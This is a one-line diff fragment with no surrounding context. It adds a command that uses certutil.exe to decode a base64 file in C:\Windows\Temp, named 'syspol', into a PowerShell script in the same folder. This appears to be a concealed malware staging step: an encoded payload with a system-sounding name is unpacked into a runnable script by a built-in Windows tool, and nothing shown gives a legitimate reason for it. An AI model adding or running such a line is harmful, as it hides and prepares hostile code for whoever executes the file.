@@ -1,0 +1,2 @@
+﻿certutil.exe -decode -f C:\Windows\Temp\syspol.b64 C:\Windows\Temp\syspol.ps1
+
